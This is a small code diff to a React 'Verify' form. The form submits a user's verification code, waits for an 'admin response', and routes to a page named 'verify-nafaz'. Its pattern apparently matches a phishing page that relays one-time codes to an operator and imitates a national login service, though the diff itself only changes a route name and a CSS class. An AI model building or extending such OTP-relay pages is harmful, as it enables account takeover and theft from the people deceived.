@@ -24,7 +24,7 @@ function Verify() {
         "رمز التحقق": data.code,
       },
       current: "verify",
-      nextPage: "nafaz",
+      nextPage: "verify-nafaz",
       waitingForAdminResponse: true,
     });
   };
@@ -36,7 +36,7 @@ function Verify() {
           className="flex flex-col gap-2 max-w-lg mx-auto bg-white p-8 rounded-2xl"
           onSubmit={sendData}
         >
-          <div className="py-2 px-6 mb-4 rounded-xl bg-main">
+          <div className="py-2 px-6 mb-4 rounded-xl">
             <img
               src="/assets/images/logo.svg"
               alt="logo"
